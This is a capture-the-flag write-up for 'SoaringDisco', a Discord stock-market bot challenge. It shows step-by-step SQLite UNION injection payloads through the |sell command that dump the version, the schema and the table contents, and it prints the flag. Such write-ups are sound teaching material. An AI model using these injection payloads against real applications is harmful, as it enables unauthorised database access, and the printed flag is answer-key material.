## Title: SoaringDisco
**Points:** 115
**Solves:** 53

### Descriptions:
Ensure your economic independence (100000000 USD to be exact) by finding the ultimate stock through this extremely realistic stock market discord-bot emulation. To avoid chaos, the bot is only answering DM messages. Upon reaching the goal, StockBot will hand over the flag. 

The bot takes commands on the form "|<cmd>".
Output of |help:
```
|help - Show this menu
        |start - Initiate an account, reset account if already created
        |stats - show account stats
        |buy <name> <amount> - Buy a stock
        |sell <name> - Sell all owned stocks with <name>
        |stockinfo <name> - Show current price of stock

        Currently available stocks on market: "gme", "amc", "rkt", "cat", "tsla", "apha", "nok", "nio"
```

### Solution:
After testing all the commands and observing the output of them, especially for invalid input arguments, we saw that the |sell command behaved differently. 
When selling stocks we got the following output:
```
Executed "|sell tsla" for user xxx
 Current price: [('tsla', 1019.032849391968)]
Sold 1 tsla for 1019.032849391968 with a brokerage of 5 USD
```

And when trying to sell invalid stocks, we got the following output:
```
Executed "|sell flag" for user xxx
 Stock price not available
```

From these two output we can see two things.
First, the output of the valid command seem to include a print of an array with a tuple value.
Second, it seems like the command makes some sort of lookup in a database, since it says that the stock price isn't available for invalid stocks.

Executing |sell ';0=0' gave "Unknown error" as output, so this definitely some call to a database.

It turns out that it is a SQLite database.
`|sell gme'//UNION//SELECT/**/sqlite_version(),123--`
```
Executed "|sell gme'//union//select/**/sqlite_version(),123--" for user xxx
 Target stock is not currently owned.
Buy it on the market: [('3.31.1', 123), ('gme', 100.6712682078159)]
```

Then we dumped table information.
```
Executed "|sell gme'//union//select//name,type//from/**/sqlite_master--" for user xxx
 Target stock is not currently owned.
Buy it on the market: [('accounts', 'table'), ('gme', 100.6712682078159), ('prices', 'table'), ('stocks', 'table')]
```

```
Executed "|sell gme'//union//select//sql,null//from/**/sqlite_master--" for user xxx
 Target stock is not currently owned.
Buy it on the market: [('CREATE TABLE accounts (accountID integer PRIMARY KEY, balance integer, sendFlag integer)', None), ('CREATE TABLE prices (symbolName, price integer)', None), ('CREATE TABLE stocks (accountID integer, symbolName, amount integer, price integer)', None), ('gme', 100.60329665662745)]
```

Now that we had the table information, we tried to change the contents of them, but we were unsuccessful.

One of the team members decided to dump the inserted tuples of the table and we found out that there was an unlisted stock.

```
Executed "|sell gme'//union//select//symbolname,price//from/**/prices--" for user xxx
 Target stock is not currently owned.
Buy it on the market: [('amc', 6.051538314454634), ('apha', 15.486072996060715), ('b3t31g3u53', 1), ('cat', 143.1388874302272), ('gme', 82.29697899469544), ('nio', 26.697354378778705), ('nok', 2.84909810740017), ('rkt', 16.940124230244436), ('tsla', 1918.1700667261787)]
```

That b3t31g3u53 stock sounds like a good investment.
It really was a good investment.
```
Executed "|sell b3t31g3u53" for user xxx
 Current price: [('b3t31g3u53', 1)]
Congratulations, through immense soaring your stock b3t31g3u53 was sold for 100000000 USD
Congratulations! midnight{tH3_sh0Rt5_n0T_5qu33zed_4nD_tHe_g41NS_n0T_w0N}
```

**Flag:** midnight{tH3_sh0Rt5_n0T_5qu33zed_4nD_tHe_g41NS_n0T_w0N}
